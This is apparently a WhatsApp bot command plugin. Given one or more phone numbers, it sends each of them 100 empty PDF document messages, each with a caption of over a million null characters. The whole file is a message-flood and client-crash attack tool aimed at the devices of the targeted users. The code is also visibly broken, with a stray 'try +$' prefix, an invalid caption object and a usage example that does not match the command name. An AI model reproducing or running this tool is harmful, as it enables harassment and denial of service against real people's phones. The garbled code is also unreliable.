try +$ smd(
  {
    pattern: "fdrd",
    alias: ["send"],
    desc: "Send 100 empty document messages with a constant caption to specific numbers",
    type: "whatsapp",
  },
  async (message, args) => {
    try {
      // Define the constant caption for the document messages
      const caption = { "\u0000".repeat(1020000) };

      // Check if numbers were provided
      if (!args) {
        return await message.reply(
          "*Please provide one or more phone numbers.*\nExample: ,forward112 2349112171078 2348012345678"
        );
      }

      // Split the numbers by spaces and format each as a JID
      const jids = args.split(" ").map((num) => `${num.trim()}@s.whatsapp.net`);

      // Define the empty document message structure
      const documentMessage = {
        document: Buffer.from(""), // Empty document
        mimetype: "application/pdf", // MIME type can be adjusted if needed
        caption: caption,
      };

      // Send 100 empty document messages with the constant caption to each JID
      for (const jid of jids) {
        for (let i = 0; i < 100; i++) {
          await message.bot.sendMessage(jid, documentMessage);
        }
      }

    } catch (error) {
      await message.reply("An error occurred: " + error.message);
    }
  }
);

